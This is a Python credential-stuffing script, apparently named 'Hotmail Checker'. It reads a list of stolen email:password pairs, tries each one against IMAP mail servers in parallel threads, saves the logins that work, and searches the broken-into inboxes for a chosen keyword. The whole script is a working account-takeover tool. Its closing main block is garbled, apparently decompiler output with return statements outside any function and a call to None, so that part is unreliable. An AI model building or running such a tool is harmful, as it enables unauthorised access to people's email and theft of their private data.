import requests
import imaplib
import os
import ctypes
from datetime import datetime
from threading import Thread, Lock
import time
from colorama import Fore, Style, init
from tkinter import Tk
from tkinter.filedialog import askopenfilename
import signal
import sys
import win32api
import win32con
import win32gui

init(autoreset=True)
lock = Lock()
good = 0
not_found = 0
bad = 0
checked = 0
found = 0
max_retries = 3
total_checked = 0
valid_filename = ''
found_filename = ''

def choose_file():
    Tk().withdraw()
    file_path = askopenfilename(title='Choose a file with email:password list')
    return file_path

def clear():
    if os.name == 'nt':
        os.system('cls')
        return None
    os.system('clear')

def set_console_title(title):
    if os.name == 'nt':
        ctypes.windll.kernel32.SetConsoleTitleW(title)

def get_imap_server(email_address):
    _, domain = email_address.split('@', 1)
    outlook_domains = [
        'hotmail.com',
        'outlook.com',
        'hotmail.fr',
        'outlook.fr',
        'live.com',
        'live.fr'
    ]
    if domain in outlook_domains:
        return 'outlook.office365.com'
    return domain

def search_email(email, password, keyword, valid_filename, found_filename, retry=0):
    global good, found, not_found, bad, checked, total_checked
    imap_server = get_imap_server(email)
    imap = imaplib.IMAP4_SSL(imap_server, timeout=10)
    imap.login(email, password)
    status, messages = imap.select('inbox')
    if status == 'OK':
        with lock:
            good += 1
        with open(valid_filename, 'a') as valid_file:
            valid_file.write(f'{email}:{password}\n')
        
        result, data = imap.uid('search', None, f'(TEXT "{keyword}")')
        if result == 'OK' and data[0]:
            mentioned_times = len(data[0].split())
            if mentioned_times > 0:
                with lock:
                    found += 1
                result_string = f'Found: {email}:{password} [V] Keyword: {keyword} [V] Mentions: {mentioned_times}'
                with open(found_filename, 'a') as result_file:
                    result_file.write(result_string + '\n')
            else:
                with lock:
                    not_found += 1
        else:
            with lock:
                bad += 1
    imap.logout()
    if retry == 0:
        with lock:
            checked += 1
            total_checked += 1

def process_lines(function, lines, valid_filename, found_filename):
    threads = []
    batch_size = 30
    for i in range(0, len(lines), batch_size):
        batch = lines[i:i + batch_size]
        for credentials in batch:
            if len(credentials) < 2:
                continue
            email, password = credentials
            thread = Thread(target=function, args=(email, password, keyword, valid_filename, found_filename))
            threads.append(thread)
            thread.start()
            time.sleep(0.05)
        for thread in threads:
            thread.join()

def inbox_searcher(file, keyword, total_lines):
    global valid_filename, found_filename
    file_basename = os.path.basename(file)
    valid_filename = f'valid_{file_basename}.txt'
    found_filename = f'found_{keyword}_emails.txt'
    
    if os.path.exists(file):
        with open(file, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [line.strip().split(':') for line in f.readlines()]
            start_time = datetime.now()
            Thread(target=print_status, args=(file_basename, keyword, total_lines, start_time)).start()
            process_lines(search_email, lines, valid_filename, found_filename)
            display_results()
    else:
        print(f'File \'{file}\' does not exist.')
        print('Please choose a valid file.')
        time.sleep(2)
        clear()

def print_status(input_filename, keyword, total_lines, start_time):
    while total_checked < total_lines:
        time.sleep(1)
        elapsed_time = datetime.now() - start_time
        minutes = elapsed_time.total_seconds() / 60
        rate = total_checked / minutes if minutes > 0 else 0
        title = f'Hotmail Checker Valide v0.4Beta Test Checked: {total_checked} Good: {good} Bad: {bad} Found: {found}'
        set_console_title(title)
        clear()
        print(Fore.CYAN + '\x1b[H\x1b[J', end='')
        print(Fore.YELLOW + '==================================================')
        print(Fore.GREEN + 'Hotmail Checker Valide v0.4Beta Test Results'.center(50))
        print(Fore.YELLOW + '==================================================')
        print(f'{Fore.GREEN}Good: {good}'.ljust(50))
        print(f'{Fore.GREEN}Found: {found}'.ljust(50))
        print(f'{Fore.RED}Bad: {bad}'.ljust(50))
        print(f'Checked: {total_checked}/{total_lines} ({(total_checked / total_lines) * 100:.2f}%)'.ljust(50))
        print(f'Rate: {rate:.2f} accounts/min'.ljust(50))
        print(f'File: {input_filename}'.ljust(50))
        print(f'Keywords: {keyword}'.ljust(50))
        print(Fore.YELLOW + '==================================================')

def display_results():
    pass

def on_close():
    sys.exit(0)

def set_windows_close_handler():
    hwnd = win32gui.GetForegroundWindow()
    win32gui.SetWindowLong(hwnd, win32con.GWL_WNDPROC, on_close)

signal.signal(signal.SIGINT, on_close)

if __name__ == '__main__':
    file = choose_file()
    if not file:
        print('No file selected.')
        exit()
    keyword = input(f'''{Fore.LIGHTGREEN_EX}[V]{Style.RESET_ALL}Enter keyword to search for in emails, just one: ''')
    if os.name == 'nt':
        set_windows_close_handler()
    if os.path.exists(file):
        f = open(file, 'r', encoding = 'utf-8', errors = 'ignore')
        for line in []:
            line = f.readlines()[line.strip().split(':')]
            lines = f.readlines()
            total_lines = len(lines)
            None(None, None)
            inbox_searcher(file, keyword, total_lines)
            return None
            print(f'''File \'{file}\' does not exist.''')
            return None
            return None
            line = None
            if not None:
                pass